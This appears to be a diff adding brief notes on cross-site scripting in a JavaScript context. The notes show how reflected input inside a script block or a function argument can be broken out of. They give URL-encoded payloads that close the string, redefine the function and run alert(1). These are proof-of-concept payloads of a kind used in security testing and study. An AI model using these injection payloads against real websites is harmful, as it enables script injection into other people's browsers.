@@ -1,0 +1,39 @@
+Exploitable scenarios
+
+<script>
+    leo.write('test','reflection_here')
+</script>
+
+---------------------------------------------------------
+
+vulnerableFunction('test', 'INJECTION'); 
+param='-alert(1)-'
+vulnerableFunction('test', ''-alert(1)-''); 
+
+----------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------
+
+vulnerableFunction('test', ''-alert(1)-''); 
+
+function vulnerableFunction(a,b){
+    return 1
+};
+
+===> Payload: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
+
+---------------------------------------------------------
+
+vulnerableFunction('test', 'test'); 
+
+function vulnerableFunction(a,b){
+    return 1
+};
+
+alert(1)
+
+===> Payload: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
+
+----------------------------------------------------------
+
+
